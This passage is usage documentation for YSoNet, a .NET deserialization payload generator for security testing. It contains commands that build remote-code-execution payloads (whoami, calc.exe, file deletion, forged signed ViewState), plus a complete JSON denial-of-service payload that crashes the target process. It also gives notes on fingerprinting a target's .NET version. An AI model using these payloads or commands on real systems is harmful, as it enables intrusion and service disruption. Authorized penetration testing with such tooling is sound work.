# Usage and Examples

This is the detailed reference. Start with the [quick reference](quick-reference.md)
for common tasks, or [Getting Started](getting-started.md) for installation.

Command-line reference for YSoNet, plus worked examples. For the gadget and plugin catalog, see [Gadgets and Plugins](gadgets-and-plugins.md).

Back to [documentation index](README.md).

`--help` prints a compact command guide. Use `--fullhelp` for the complete catalogue
and global options, or `-g <name> -h` / `-p <name> -h` for one module.

## Command line

Use `ysonet.exe --fullhelp` to see the full details. You can also see a specific gadget's or plugin's help:

- `ysonet.exe -g NameHere -help`
- `ysonet.exe -p NameHere -help`

```text
Usage: ysonet.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64|raw-
                               urlencode|base64- urlencode|hex).
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).
  -s, --stdin                The command to be executed will be read from
                               standard input (the first line, up to 2,050
                               bytes). A non-empty -c wins.
      --bgc, --bridgedgadgetchains=VALUE
                             Chain of bridged gadgets separated by comma (,).
                               Each gadget will be used to complete the next
                               bridge gadget. The last one will be used in the
                               requested gadget. This will be ignored when
                               using the searchformatter argument.
  -t, --test                 Test locally. With --legacyfx, use the
                               separately shipped .NET Framework 3.5 / CLR2
                               process; otherwise use ysonet's current CLR4
                               process. Default: false
      --testclr2             Test locally in the separately shipped .NET
                               Framework 3.5 / CLR2 process. Supports
                               BinaryFormatter, LosFormatter, and SoapFormatte-
                               r. Default: false
      --outputpath=VALUE     The output file path. It will be ignored if
                               empty.
      --minify               Minify payloads where applicable. A gadget may
                               refuse --minify when it would rewrite operator
                               data whose characters or bytes must survive
                               exactly. Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple
                               (always `true` with `--minify` for binary
                               formatters). Default: true
      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
                               generation. The shared transform rewrites
                               framework assembly versions; gadgets that carry
                               source may also use the CLR-v2 compiler, and a
                               gadget may author a type's older assembly
                               identity when it moved between CLR generations.
                               The graph and your input are untouched. It is
                               not proof that every gadget works there.
                               Default: false
      --raf, --runallformatters
                             Try every listed non denial-of-service gadget
                               whose formatter name contains the given text.
                               Requires -f plus -c or -s, and cannot be
                               combined with -g or -p. Uses each formatter's
                               default output format, ignores -o, -t, and --
                               testclr2, prints payloads with their length, and
                               reports per-payload failures plus a summary on
                               stderr. Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).
      --list=VALUE           Print a machine-readable list (one item per
                               line) and exit. Categories:
                               gadgets|plugins|formatters|options|outputs|values|value-options. Add
                               -g <gadget> to list that gadget's
                               formatters/options, or -p <plugin> to list that
                               plugin's options. Useful for shell tab-
                               completion scripts.
      --category=VALUE       Find gadgets by category (repeatable): --
                               category=axis=value where axis is
                               kind|formatter|input|requirement| version.
                               Repeat for OR within an axis and AND across axe-
                               s. A version is an exact runtime build (4.8.1, -
                               5.0, mono) and only lists gadgets recorded as
                               working there. Alone it prints matching gadgets
                               and their categories; with '--list gadgets' it
                               prints matching names only. Example: --
                               category=kind=code-execution --
                               category=formatter=Json.NET
      --debugmode            Enable debugging to show exception errors and
                               output length
      --i-understand-dos     Acknowledge that a denial-of-service gadget can
                               disrupt or terminate the target process. It is
                               required to generate one and is not needed by
                               any other gadget.
  -h, --help                 Show the quick guide or selected-module help and
                               exit.
      --fullhelp             Show all gadgets, plugins, and global options,
                               or selected-module help, and exit.
      --prv, --display-private
                             Also list private gadgets and plugins in --
                               fullhelp, --credit, --list, --sf, --raf, --
                               category and interactive mode. They always build
                               when named on the command line; this only shows
                               them in listings.
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).
      --checkupdate          Check GitHub for a newer YSoNet release and exit.
      --runmytest            Runs that `Start` method of `TestingArenaHome` -
                               useful for testing and debugging.
```

Note: Machine authentication code (MAC) key modifier is not used for LosFormatter in YSoNet. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

## Option values and editor defaults

The wizard uses explicit defaults and suggested values declared by each module. Help
wording does not change the generated command. A default that depends on another option
stays unset so the module can select it. Required markers are hints; mode-specific
requirements still follow the selected mode.

Read a module's declared suggestions without generating anything:

```powershell
.\ysonet.exe -p Resx --list values --option mode
.\ysonet.exe -g ObjectDataProvider --list values --option variant
```

`--list value-options` lists only aliases that take a value. Any declared option alias works. An empty result means no suggestions are declared, not
that the option rejects input. Unknown modules or options fail with a diagnostic. The
PowerShell completer uses these same suggestions after `-g` or `-p`, including the
`--option=value` form. Help and the generated full-help reference show the same defaults.

## Scripting contract

A one-shot gadget or plugin command exits zero when it returns its result and writes it
successfully. Missing arguments, unknown options/modules/formatters/output encodings,
generation errors, and failed output writes exit nonzero. Check `$LASTEXITCODE` in
PowerShell; do not depend on a particular nonzero value.

Stdout contains the requested data. Diagnostics, warnings, and debug details go to
stderr, including messages printed by a plugin or gadget during generation. With
`--outputpath`, the file contains only the result; debug length messages do not enter
that file. Avoid merging stderr into a saved payload. A write failure can leave a
partial file or stream, so discard output from a failed command.

No arguments, explicit help, lists, and formatter searches are information requests
and exit zero when successful. `--raf` retains its documented best-effort contract:
zero means at least one payload was written, not that every cell succeeded. A local
self-test's diagnostics remain separate from generation success; exit zero does not
prove an effect in a target application.

```powershell
.\ysonet.exe -g ObjectDataProvider -f Json.NET -c 'echo example' --outputpath payload.json
if ($LASTEXITCODE -ne 0) { throw 'YSoNet did not produce a successful result.' }
```

## Find a gadget by category

Every gadget declares discovery metadata: its payload `kind`, the `formatter` (serializer) it supports, the `input` it accepts, its target `requirement`, and the runtime `version` its effect is recorded on. Use `--category=axis=value` to find gadgets by these facets. This is discovery only; it does not build a payload.

- Axes: `kind`, `formatter`, `input`, `requirement`, `version`.
- Repeat the same axis for OR; use different axes for AND. One gadget (or one of its variants) must match the whole query.

```bash
# Show all code-execution gadgets that support Json.NET, with their categories
./ysonet.exe --category=kind=code-execution --category=formatter=Json.NET

# Print only the matching gadget names (for scripts), by adding --list gadgets
./ysonet.exe --list gadgets --category=kind=network

# Gadgets recorded as working on a given runtime build
./ysonet.exe --category=version=4.8.1
./ysonet.exe --category=version=5.0
```

### The version axis

The other axes use broad words. This one uses exact build numbers, because "old
build" does not tell you whether a payload lands on the target in front of you.
Write it the way you say it: `4.8.1`, `.NET 4.8`, `net5.0`, `mono`, or the
canonical `net-fx-4.8.1`.

The version is always about the TARGET, never about the copy of ysonet you are
running. Two different target properties can decide it, and both appear on this
axis:

- the .NET version the target process RUNS ON, when a runtime change or a patch
  is what fixed the behaviour; and
- the .NET version the target application was BUILT AGAINST, when the gate is a
  compile-time compatibility switch.

`DataViewManagerXxe`, `DataSetXxe`, `XmlDocumentXxe` variant 1 and
`XmlDocumentSurrogateXxe` are the second kind, and it is worth
knowing because it surprises people: they list 4.0 - 4.5.1 because
`XmlReaderSettings.EnableLegacyXmlSettings()` reads the target application's own
`TargetFrameworkAttribute`. A fully patched Windows box with .NET 4.8.1 runs
those payloads all day if the app hosting the deserializer was compiled against
4.5.1, and no machine runs them against an app compiled against 4.5.2 or later.
Installing or removing framework versions on the target changes nothing. It also
means `ysonet.exe -t` cannot fire them: this tool targets 4.7.2, so its own XML
reader gets a null resolver, which is why it prints a note saying so.
`XmlDocumentXxe` variant 2 is the counter-example worth knowing: it assigns the
document its OWN `XmlUrlResolver`, so that switch is never consulted, it declares
4.0 - 4.8.1, and `-t` really does fetch.

Read a listed version as "reproduced or documented here", never as "fails
everywhere else". A version that is not listed only means nobody recorded it.
Many gadgets are still `unspecified`, and where the real gate is not a version at
all (an OS patch, a library version, a machine-wide switch) the gadget stays
`unspecified` and says so in its own help text. Use `--category=version=unspecified`
to list what has not been pinned down yet.

Interactive mode has the same filter. Inside the "Build a gadget payload" flow, pick `[ Filter by category... ]` (or press `Ctrl+F` in the live columns) to open a checklist over the five axes with live match counts, then narrow the gadget list to what matches.

## Run all formatters (`--raf`)

`--raf` builds one payload for every gadget whose formatter name contains the text you
pass to `-f`. It is a bulk diagnostic: use it to see, in one run, which gadgets can reach
a serializer you have found on a target.

```bash
./ysonet.exe --raf -f SharpSerializerBinary -c calc.exe
```

A cell (one gadget with one of its formatters) is included when:

- the gadget appears in listings (add `--display-private` to widen that in a local checkout);
- it is not a denial-of-service gadget;
- and one of its advertised formatter strings contains your `-f` text, ignoring case.

Every included cell gets the **same** command and the same gadget options. That is the
point of the mode, and also its limit: gadgets do not accept the same kind of input. One
wants a command line, another an assembly path, another an absolute URL. So a run where
some cells fail is normal, not broken.

What each stream carries:

- **stdout**: the heading, the DoS skip notice when there is one, and each payload with
  its length.
- **stderr**: one line per failed cell, plus a summary.

```text
RAF failed: gadget=<name>, formatter=<name>: <reason>
RAF inspection failed: gadget=<name>: <reason>
RAF summary: matched=<M>, generated=<G>, failed=<F>, inspection-failed=<I>.
```

`matched` counts the cells the `-f` text selected, `generated` counts the payloads
actually written, and `failed` counts the rest, so `matched = generated + failed`.
`inspection-failed` counts gadgets that could not even be loaded or asked for their
formatter list.

Exit code: **0 when at least one payload was written**, non-zero when none was. It does
not mean every cell succeeded. If you need complete coverage, read `failed` and
`inspection-failed` from the summary rather than the exit code.

Rules for the other options:

- `-f` is required, and so is a command source: `-c` or `-s`. Without them the run stops
  with `--raf requires -f/--formatter and either -c/--command or -s/--stdin.`
- `-g` and `-p` select a different execution path, so combining them with `--raf` is
  refused rather than silently ignored: `--raf cannot be combined with -g/--gadget or
  -p/--plugin.`
- `--help`, `--fullhelp`, `--credit` and `--sf` still win over `--raf`, because printing
  information builds nothing.
- `-o` is ignored: every payload uses its own formatter's default output format.
- `-t` is ignored: a bulk run never executes a payload locally.
- `--outputpath` is honored. The first payload replaces the file, the rest are appended.
- A non-empty `-c` wins over `-s`, exactly as in a single-gadget run.
- Denial-of-service gadgets are always excluded, even with `--i-understand-dos`.

## Denial-of-service gadgets

A few gadgets do not run code: they disrupt or terminate the target process. They are
their own category (`kind=denial-of-service`) and YSoNet will not build one by accident.

```bash
# Find them
./ysonet.exe --category=kind=denial-of-service

# Without the acknowledgement, the run is refused
./ysonet.exe -g <DosGadget> -f Json.NET -c x
Refused: <DosGadget> is a denial-of-service gadget. Re-run with --i-understand-dos.

# With it, the payload is built and a warning is printed to stderr first
./ysonet.exe -g <DosGadget> -f Json.NET -c x --i-understand-dos
WARNING: <DosGadget> is a denial-of-service payload.
It can disrupt or terminate the target process.
Use it only against systems you are authorized to test.
```

The warning goes to stderr, so the payload on stdout stays clean and pipeable.
These gadgets are also left out of every "generate everything" run (`--raf` and the
interactive run-all). When the run actually left one out, it says so with a count before
the payloads; when the catalog has none, there is no notice at all:

```bash
./ysonet.exe --raf -f Json.NET -c calc.exe
Skipped 1 denial-of-service gadget. Run it by name with --i-understand-dos.
```

The same flag works for a gadget named in a `--bgc` chain, and for the plugins that
let you pick an inner gadget (`ViewState`, `Resx`, `SharePoint`, `Altserialization`,
`ApplicationTrust`, `TransactionManagerReenlist`).

### `WSManPluginInstance`

One of the catalog's two denial-of-service gadgets. It takes no `-c` at all: the whole
payload is a type name.

```bash
./ysonet.exe -g WSManPluginInstance -f Json.NET --i-understand-dos
{
    "$type":"System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
}
```

Building that object is the whole attack. Its finalizer frees a `GCHandle` that only
`GetEntryDelegate` ever allocates, and a deserializer never calls that, so the handle is
still the default one. Freeing it throws on the finalizer thread, and an exception there
terminates the process.

BinaryFormatter, SoapFormatter and LosFormatter cannot name that non-`[Serializable]`
type as their root. For those three, the gadget serializes
`System.Security.Policy.HashMembershipCondition` instead. Its serialization constructor
passes the `HashAlgorithm` string through `CryptoConfig`, which constructs the fixed WSMan
type before a later cast rejects it; the failed cast does not unregister the constructed
object's finalizer. This is a carrier difference only—the effect and `--assembly` option are
the same as for the direct-construction formats.

Two things to plan around:

- **The effect is asynchronous.** It happens on the target's next garbage collection, not
  when the payload is read. A busy process may die within moments; an idle one may take a
  while.
- **The target needs Windows PowerShell's `System.Management.Automation`.** That is the
  gate, not a framework version: the default `--assembly` value is the 3.0.0.0 GAC
  identity, unchanged from PowerShell 3.0 through Windows PowerShell 5.1. Most Windows
  systems have it; a stripped or PowerShell-free image does not. PowerShell 7 ships a
  different assembly identity and nothing here has been reproduced against it.

`--assembly` overrides that identity and is written exactly as typed, so you can point it
at a repackaged, renamed or differently versioned copy. Only an empty value is refused,
and the TYPE name never changes.

```bash
./ysonet.exe -g WSManPluginInstance -f Xaml --i-understand-dos \
    --assembly "System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
```

`-t` works, and it is the one gadget where it never deserializes in the YSoNet process.
The payload is written to a temp file, a child `ysonet.exe` reads it and forces a
collection, and the child is the one that dies:

```bash
./ysonet.exe -g WSManPluginInstance -f Json.NET --i-understand-dos -t
[self-test] WSManPluginInstance: a child ysonet process is about to be terminated on purpose. This process is not affected.
[self-test] WSManPluginInstance: running in a child process (this payload terminates the runtime when it fires).
[self-test] the child process terminated with exit code 0xE0434352: Unhandled Exception: System.InvalidOperationException: Handle is not initialized.
```

That really does kill a process on your machine, so keep it for a host you are happy to
experiment on.

### `HashPEFileHandle`

The other denial-of-service gadget, and a much narrower one: it only reaches a **CLR v2**
target (.NET 2.0 / 3.0 / 3.5). There, `System.Security.Policy.Hash`'s deserialization
constructor takes the `PEFile` member as a native PE-file handle and adopts it. .NET 4
removed that branch, so a modern target simply does not have the code.

`-c` is an address, as hex or decimal, signed or unsigned. It is parsed, never validated:
a pointer is a bit pattern, not a magnitude, and which address is interesting is a
property of the target, not of YSoNet.

```bash
./ysonet.exe -g HashPEFileHandle -f BinaryFormatter -c 0x41414141 --i-understand-dos
```

Three things to plan around:

- **What is and is not claimed.** Handing native code a handle it did not create may crash
  or corrupt the target when that handle is later consumed or released. No code execution
  and no memory read or write is proved, and none is claimed.
- **The effect is not immediate.** Nothing happens at deserialization; it happens whenever
  the target's native code touches the adopted handle.
- **`-t` is refused outright.** The isolated self-test child runs the current framework,
  which does not contain the branch, so a clean result would be a false negative - and an
  arbitrary pointer has no safe automatic effect test in any case.

Both mscorlib types travel as records with no explicit assembly version, so they bind to
whatever mscorlib the reader has, which is what lets one payload reach the old runtime.

## Choose a TypeConfuseDelegate profile

The family names use one suffix for the reason an operator would select a different
profile. Runtime-specific profiles name the exact .NET Framework generation; profiles
with an external dependency name that product. Workflow and comparer shape remain visible
here and in `--fullhelp`, but they are implementation details shared by more than one
profile and therefore are not accumulated in the command name.

| Gadget | Choose it for | Distinguishing graph or requirement |
|---|---|---|
| `TypeConfuseDelegate` | .NET Framework 4.5-4.8.1 | Built-in `ComparisonComparer<T>` and an ordered-tree root; three root variants. |
| `TypeConfuseDelegateNetFx40` | Exactly .NET Framework 4.0 | Built-in Workflow reconstruction of `Array.FunctorComparer<T>`; a genuine 4.0 install is required. |
| `TypeConfuseDelegateNetFx35` | Exactly .NET Framework 3.5 / CLR 2 | Built-in Workflow reconstruction plus System.Core 3.5; local testing uses the CLR2 host. |
| `TypeConfuseDelegatePowerShell` | The measured 4.8.1 PowerShell target | PowerShell Utility's equality comparer plus the Workflow type-check application setting. |
| `TypeConfuseDelegateMono` | Mono | Mono-specific comparer and runtime behavior. |
| `TypeConfuseDelegateFileOperations` | A direct file operation instead of command execution | The standard 4.5+ TCD primitive with an effect-specific sink. |

The renamed profiles were not previously published, so the old development names are not
kept as aliases. Each profile appears once in listings and completion.

## Target the CLR v2 generation (`--legacyfx`)

A payload names the assemblies it needs, and ysonet writes the .NET Framework 4.x
identities by default: `System, Version=4.0.0.0, ...`. The strict readers -
`SoapFormatter`, `NetDataContractSerializer`, `DataContractSerializer`,
`XmlSerializer`'s root envelope, `JavaScriptSerializer` - bind that identity exactly as
written, so on a .NET Framework 2.0, 3.0 or 3.5 target they refuse the payload before
the chain is reached, even though a perfectly good 2.0 `System.dll` is sitting right
there. (`BinaryFormatter` and `LosFormatter` are the exception: their binder unifies
the identity, which is why many of their payloads already land unchanged.)

`--legacyfx` rewrites those identities to the CLR v2 generation's versions.

```bash
# Refused on a .NET 2.0-3.5 target: the SOAP namespace URI names System 4.0.0.0
./ysonet.exe -g TempFileCollection -f SoapFormatter -c "C:\inetpub\wwwroot\robots.txt"

# Accepted there: the same payload, naming System 2.0.0.0
./ysonet.exe -g TempFileCollection -f SoapFormatter -c "C:\inetpub\wwwroot\robots.txt" --legacyfx
```

`TypeConfuseDelegateNetFx35` is the purpose-built command chain for the CLR-v2
generation. It applies the legacy identities itself, so an explicit `--legacyfx` is
redundant. In the interactive editor the setting is therefore shown as `on (fixed)` and
cannot be switched off:

```bash
./ysonet.exe -g TypeConfuseDelegateNetFx35 -f BinaryFormatter -c "whoami"

# Direct SOAP: the external root remains List<object>, not an outer surrogate carrier
./ysonet.exe -g TypeConfuseDelegateNetFx35 -f SoapFormatter -c "whoami"

# "test locally" automatically selects the shipped CLR2 victim for this gadget
./ysonet.exe -g TypeConfuseDelegateNetFx35 -f SoapFormatter -c "calc.exe" --test
```

Its raw and minified BinaryFormatter, SoapFormatter and LosFormatter forms are measured
executing on .NET Framework 3.5 / CLR 2.0.50727. The SOAP form is a direct document whose
external root is `List<object>` and whose nested trigger is `TreeSet<string>`; Workflow's
`ObjectSerializedRef` reconstructs only the internal comparer. It does not use an outer
`AxHost.State`/DataSet carrier or a nested BinaryFormatter stream. The target also needs
System.Core 3.5 and System.Workflow.ComponentModel. It does not advertise
NetDataContractSerializer (the CLR-2 reader requires a missing `memberDatas` element), and
it does not target CLR 4: a 4.8.1 read rejects the reconstruction with `ArgumentException`
before the command. Depending on the fixup path, the measured message names unequal
`members`/`data` lengths or `context`.

For a CLR4 target, use the normal `TypeConfuseDelegate`. Its direct SoapFormatter form is
available on variants 1 (`SortedSet<string>`) and 3 (`TreeSet<string>`):

```bash
./ysonet.exe -g TypeConfuseDelegate -f SoapFormatter -c "whoami"
./ysonet.exe -g TypeConfuseDelegate -f SoapFormatter --variant 3 -c "whoami"
```

The SOAP root remains the selected native CLR4 container and the nested comparer is the
native `ComparisonComparer<string>`. It does not wrap the payload in Workflow or another
surrogate carrier. Variant 2 (`SortedDictionary`) is not offered for SOAP because its
serialized backing tree is a separate, deeper generic graph; it remains available on
BinaryFormatter, LosFormatter and NetDataContractSerializer. All normal TCD variants need
.NET Framework 4.5 or later: .NET 4.0 has neither `Comparer<T>.Create` nor the serializable
`ComparisonComparer<T>` that this graph places on the wire. This is a real graph boundary,
not merely the version the tool was compiled against; use the separate `NetFx35` profile
for the CLR-v2 generation. Consequently the normal TCD does not offer `legacyfx`
in interactive mode, and a scripted `--legacyfx` is refused rather than producing a payload
that cannot run on CLR2. The same rule applies to `TypeConfuseDelegateFileOperations` and
the Mono-specific TCD.

### PowerShell equality-comparer profile

`TypeConfuseDelegatePowerShell` is a separate gadget, not `TypeConfuseDelegate`
variant 4. It carries an `IEqualityComparer<string>` in `Dictionary<string,string>` rather
than an `IComparer<string>` in one of the ordered-tree containers:

```bash
./ysonet.exe -g TypeConfuseDelegatePowerShell -f BinaryFormatter -c "whoami"
./ysonet.exe -g TypeConfuseDelegatePowerShell -f LosFormatter -c "whoami" --minify
```

The target needs all of the following:

- .NET Framework 4.8.1 (the only runtime currently proved; older versions are unclaimed).
- `Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0`.
- This application setting effective before the target deserializes this payload:

  ```xml
  <add key="microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck"
       value="true" />
  ```

The setting is mandatory on current serviced Framework. It can come from application
config at process startup or from an earlier `ActivitySurrogateDisableTypeCheck` payload
in the same process. A preceding object in the SAME serialized graph cannot arm it in
time: Workflow checks it while resolving the comparer.

Local `-t` checks Workflow's effective value. It works when the ysonet application config
sets the value, or in one interactive session after self-testing
`ActivitySurrogateDisableTypeCheck` with either variant. Variant 1 verifies its exact
payload in a safety child (because that graph terminates its host after firing), then
mirrors the setting into the interactive parent for follow-on local tests; variant 2 sets
it directly in-process. BinaryFormatter and LosFormatter are the only advertised
formatters, each proved raw and minified.
SoapFormatter's stock writer rejects the closed-generic root, and
NetDataContractSerializer's reader rejects the emitted object-reference record because
its required `memberDatas` member is missing. No other formatter has a positive effect
cell.

Normal `-c "command"` input works because ysonet supplies `cmd` and `/c command` as the
two distinct fields. With `--rawcmd`, supply an executable and an argument string; a
one-part value is refused. Equal fields are also refused because they collapse to one
Dictionary key. `--legacyfx` is not supported.

This construction is available only for generic `Dictionary<TKey,TValue>`. It cannot be
ported as another variant to `Hashtable` or `OrderedDictionary`: those containers consume
the non-generic equality interface, and the audited Framework/installed assemblies have
no usable non-generic delegate-backed comparer. The ordinary TCD's SortedSet,
SortedDictionary, and TreeSet variants use ordering comparers and remain separate graphs.

The standard and 4.0 profiles differ at an exact framework boundary:
`TypeConfuseDelegate` covers .NET Framework 4.5 through 4.8.1, while
`TypeConfuseDelegateNetFx40` is only for a target whose INSTALLED framework is
genuinely .NET Framework 4.0 (4.5+ never installed). This is decided by the installed
framework, NOT by the app pool or the app's target:

- An IIS app pool set to "v4.0" is CLR 4, not .NET 4.0. The pool dropdown chooses the CLR
  major version (v2.0 vs v4.0); there is no "4.5 pool". On a server with 4.5-4.8 installed,
  a "v4.0" pool runs 4.8, so use `TypeConfuseDelegate`.
- `<httpRuntime targetFramework="4.0"/>` in web.config only sets compatibility quirks; it
  does not restore 4.0's private type shapes. Still `TypeConfuseDelegate`.
- Use `TypeConfuseDelegateNetFx40` only on a real 4.0 install: an old Windows (for
  example Server 2008 R2 / Windows 7) that never got the 4.5+ update, or an isolated 4.0 VM.
- Quick check on the target: if `HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`
  has a `Release` value, it is 4.5+ (use `TypeConfuseDelegate`); if that value is absent it
  is genuine 4.0. `ysonet.Net40TestHost.exe --probe` reports `shape=netfx40` only on real 4.0.

For a genuine .NET Framework 4.0 target, use the target-specific `NetFx40` profile:

    ./ysonet.exe -g TypeConfuseDelegateNetFx40 -f BinaryFormatter -c "whoami"
    ./ysonet.exe -g TypeConfuseDelegateNetFx40 -f SoapFormatter -c "whoami"

It reconstructs .NET 4.0's two-field Array.FunctorComparer<string> through
ObjectSerializedRef, then triggers it from SortedSet<string>. BinaryFormatter,
SoapFormatter and LosFormatter are available; NetDataContractSerializer is not.
The target needs System.Workflow.ComponentModel. This graph is not compatible with
later CLR 4 builds, which removed the comparer's c field, so --test is refused in
ysonet's 4.7.2+ process. `legacyfx` is not offered in interactive mode, and a scripted
`--legacyfx` is refused because the payload requires CLR4 assembly identities.

Validate the effect on a target whose INSTALLED framework is genuinely .NET Framework 4.0.
.NET 4.5+ replaces 4.0 in place, so a 4.5-4.8 machine cannot fire it even when the app
targets 4.0 (an IIS pool showing "v4.0.30319" is CLR 4, not .NET 4.0). Use a Windows image
with 4.0 and no 4.5+ update, or an isolated 4.0 VM. Confirm the target with
`ysonet.Net40TestHost.exe --probe` (it prints `shape=netfx40` only on a real 4.0 runtime),
then fire one payload with its `--deserialize` mode. The repository's opt-in
`ysonet.Tests.exe --net40` tier automates this through an isolated VM and a mapped directory;
see `tools/net40-test-host/README.md` for both the manual steps and the tier setup.

Release archives include the backward-compatible `ysonet.Clr2TestHost.exe`, explicit
`ysonet.Clr2TestHost.x86.exe` and `.x64.exe` variants, and their CLR2-only runtime configs.
Each host is a
deliberately vulnerable, one-shot local process: it verifies that it is really running on
CLR `2.0.50727`, reports its process bitness before opening the generated payload,
deserializes once, reports the observation, and exits. A gadget can declare exact
non-framework dependencies for this
isolated child; each file and full assembly identity is validated before the payload is
opened, and no staged file replaces a dependency of `ysonet.exe`. Windows must have the
optional .NET Framework 3.5 feature installed. `--testclr2` selects this process
explicitly; the interactive "test locally" setting and `--test --legacyfx` select it
automatically. The shipped host reads only BinaryFormatter, LosFormatter, and
SoapFormatter payloads.

What it does and does not do:

- **The shared identity transform moves only the `Version=` field.** The assembly name,
  culture, public key token, every type name, the object graph, and your `-c` input are
  untouched by that transform. The public key
  token is the same in every framework generation, so the version is the only thing
  that has to change. Each version is the one that generation really shipped:
  `mscorlib`/`System`/`System.Web`/`System.Windows.Forms` go to 2.0.0.0, the WPF and WCF
  assemblies to 3.0.0.0, `System.Core` and `System.Web.Extensions` to 3.5.0.0, and
  `Microsoft.VisualBasic` to 8.0.0.0 (it is versioned off the Visual Basic product
  number, not the framework one).
- **It is a transform, not a compatibility claim.** It cannot make a CLR-4-only carrier,
  formatter or bundled serializer run on CLR 2, and a rewritten payload is not evidence
  that the gadget works there. The measured example: `TypeConfuseDelegate` is refused on
  a 4.x identity, and once `--legacyfx` fixes that the reader gets further and refuses
  `System.Func\`3`, which mscorlib 2.0 does not have. The identity was never the whole
  story.
- **It reaches every layer.** A bridged chain (`--bgc`) and a gadget with a hard-coded
  inner gadget both rewrite each layer in its own format before the next one wraps it.
- **`-t` runs the rewritten bytes**, so a self-test tests exactly what you are handed.
  Normal payloads run in ysonet's current CLR4 process. A `--legacyfx` payload, and a
  CLR2-only gadget such as `TypeConfuseDelegateNetFx35`, runs in the shipped CLR2
  process instead. The child proves `Environment.Version` before it reads the payload.
- **It refuses rather than guessing.** If your `-c` input itself contains a framework
  assembly identity, the two are indistinguishable in the finished payload, so the run
  fails with a message instead of silently editing your data. It also refuses when the
  payload names a framework assembly that has no CLR v2 build at all - `System.Xaml`,
  `System.ComponentModel.Composition`, `System.Activities.Presentation`,
  `System.Numerics` and friends - because a gadget carried by one of those is 4.x only by
  construction, and rewriting the versions around it would produce a payload that cannot
  bind while looking as if it had been converted.
- **`DataContractJsonSerializer` is a no-op.** That format writes no root type into the
  document, so there is nothing to rewrite; the CLR v2 root type has to come from
  whatever reads the payload.
- **A compiled assembly inside a payload is not rewritten.** For the
  `ActivitySurrogateSelector` family, `--legacyfx` instead compiles the bundled or supplied
  C# source with the v3.5 compiler and records `Func<>` delegates against `System.Core`
  3.5, where that type lives on CLR 2. A caller-supplied DLL is still used byte-for-byte.
  The source-file command shape is
  `-c "MyClass.cs;UsedRef.dll,Ref2.dll"`; the first semicolon starts the reference list
  and commas separate multiple references. The default variant and DataSet variant 3 are
  measured firing on .NET Framework 3.5; `System.Core` 3.5 is their floor. The older,
  shorter variant 2 remains 4.x-only.

Which gadgets actually FIRE on CLR 2, with or without the option, is measured against a
real 2.0.50727 child rather than assumed - see the `--legacy` test tier and each
gadget's runtime version facet.

### `--legacyfx` on a plugin

Five plugins accept `--legacyfx` as their own option: `ViewState`, `Resx`,
`Altserialization`, `ApplicationTrust` and `TransactionManagerReenlist`. Each one wraps an
in-box .NET 2.0 API (`SessionStateItemCollection.Deserialize`,
`HttpStaticObjectsCollection.Deserialize`, `ApplicationTrust.FromXml`,
`TransactionManager.Reenlist`, `ResXResourceReader`, and page-owned
`ObjectStateFormatter` with the complete signed ViewState), so the carrier was never what
kept them off a CLR v2 target - the gadget they wrap was. The ViewState evidence includes
the page path, page type, `ViewStateUserKey`, matching MachineKey and MAC validation; it is
not a parameterless LosFormatter read of the object-state prefix.

**It reaches the GADGET, not the plugin's own envelope.** That distinction matters. Four
of these plugins write an envelope that names no framework assembly at all, so there is
nothing to rewrite. `Resx` is the exception: its `.resx` resheader and assembly alias name
`System.Windows.Forms, Version=4.0.0.0`, and `--legacyfx` does NOT rewrite them. That turns
out not to matter, and it was measured rather than assumed: a CLR v2 `ResXResourceReader`
ACCEPTS such a document, loads `System.Windows.Forms 2.0.0.0` and fires. Those resheaders
are descriptive metadata, not a binding the reader enforces.

**All five are measured, not argued.** Each one executes code on a real CLR 2.0.50727 child
on the 2.0, 3.0 and 3.5 lanes, raw and minified, and the children load only 2.0/3.0
assemblies. That is what `IPlugin.RuntimeVersions()` records for them, and it is earned by
the `--legacy` test tier the same way a gadget's floor is. Check a plugin's target-runtime
evidence in its help or in the interactive plugin picker:

```
./ysonet.exe -p ApplicationTrust --help
```

The `Runtime versions:` line says `Unspecified` when no concrete target runtime has been
evidenced. It is compatibility evidence, not a promise that every inner gadget works on
that runtime.

Pair it with `-g`, which the same five plugins accept, to choose a gadget that can exist on
the target. The default gadget for most of them is `TextFormattingRunProperties`, which
needs a PowerShell assembly a CLR v2 target does not have:

```
./ysonet.exe -p ApplicationTrust -g TempFileCollection -c "C:\path\to\delete.txt" --legacyfx
./ysonet.exe -p ViewState -g ActivitySurrogateSelector --var 3 --legacyfx --islegacy \
    --vsg AAAAAAAA --vk <validationkey> --va SHA1 -c placeholder
```

The second one is the interesting shape: `--var 3` selects `ActivitySurrogateSelector`'s
`DataSet` carrier instead of the default `AxHost.State`, which is the carrier measured to
unpack on CLR 2, and `--islegacy` selects the pre-4.5 ViewState signing algorithm. The
result names no 4.x assembly anywhere. Note that any option a plugin does not recognise -
`--var` here - is passed through to the gadget you chose with `-g`.

## Private gadgets and plugins (`--display-private`)

A contributor can keep unpublished gadgets and plugins in the git-ignored
`ysonet/Generators/Private/` and `ysonet/Plugins/Private/` folders, which the build
already compiles. Such a module can declare itself PRIVATE, and then YSoNet does not
LIST it: it is absent from `--help`, `--fullhelp`, `--credit`, `--list`, `--sf`,
`--raf`, `--category`, the "not supported" suggestion lists, tab completion, and
every interactive screen. The point is recording and documentation hygiene - a demo
video or a generated document made from a normal run should not disclose unpublished
research.

```bash
# Private modules are back in every listing for this one run
./ysonet.exe --list gadgets --display-private
./ysonet.exe --help --prv
./ysonet.exe -i --prv
```

Two things do not change:

